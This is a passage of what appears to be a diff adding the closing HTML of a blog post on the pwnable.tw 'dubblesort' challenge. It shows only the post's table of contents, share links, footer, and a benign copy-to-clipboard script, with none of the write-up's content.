+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#程序分析"><span class="toc-number">1.</span> <span class="toc-text">程序分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#问题1"><span class="toc-number">1.1.</span> <span class="toc-text">问题1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#问题2"><span class="toc-number">1.2.</span> <span class="toc-text">问题2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用"><span class="toc-number">2.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#栈数据泄露"><span class="toc-number">2.1.</span> <span class="toc-text">栈数据泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#栈数据覆盖"><span class="toc-number">2.2.</span> <span class="toc-text">栈数据覆盖</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#libc基址获取"><span class="toc-number">2.3.</span> <span class="toc-text">libc基址获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用思路"><span class="toc-number">2.4.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#坑在哪？"><span class="toc-number">2.5.</span> <span class="toc-text">坑在哪？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">3.</span> <span class="toc-text">PWN</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://y11en.github.io/2017/12/13/pwnable-tw-dubblesort/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://y11en.github.io/2017/12/13/pwnable-tw-dubblesort/&text=pwnable.tw-dubblesort" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://y11en.github.io/2017/12/13/pwnable-tw-dubblesort/&title=pwnable.tw-dubblesort" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://y11en.github.io/2017/12/13/pwnable-tw-dubblesort/&is_video=false&description=pwnable.tw-dubblesort" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=pwnable.tw-dubblesort&body=Check out this article: https://y11en.github.io/2017/12/13/pwnable-tw-dubblesort/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://y11en.github.io/2017/12/13/pwnable-tw-dubblesort/&title=pwnable.tw-dubblesort" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://y11en.github.io/2017/12/13/pwnable-tw-dubblesort/&title=pwnable.tw-dubblesort" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://y11en.github.io/2017/12/13/pwnable-tw-dubblesort/&title=pwnable.tw-dubblesort" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://y11en.github.io/2017/12/13/pwnable-tw-dubblesort/&title=pwnable.tw-dubblesort" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://y11en.github.io/2017/12/13/pwnable-tw-dubblesort/&name=pwnable.tw-dubblesort&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://y11en.github.io/2017/12/13/pwnable-tw-dubblesort/&t=pwnable.tw-dubblesort" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 Y11en
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
